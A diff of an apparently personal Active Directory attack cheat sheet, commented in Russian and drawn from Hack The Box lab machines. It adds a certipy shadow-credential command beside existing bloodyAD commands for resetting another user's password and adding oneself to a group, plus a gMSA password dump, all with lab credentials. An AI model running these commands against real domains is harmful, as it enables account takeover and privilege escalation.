@@ -66,7 +66,8 @@ Silvercore_21
 
 # смена пароля 
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
-    
+# Shadow Credential
+     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
 # получение информации об аккаунте  adam.silver
      bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb get object adam.silver --attr userAccountControl
  
@@ -142,8 +143,10 @@ Silvercore_21
     python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb
 
 # GenericWrite
-
-  добавляем себя в группу DEVELOPERS
+# Shadow Credential
+     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
+     
+ # добавляем себя в группу DEVELOPERS
   bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'
 
    Иногда GenericWrite не даёт прямое добавление, но позволяет изменить владельца группы (через SetObjectOwner), а затем добавить себя:
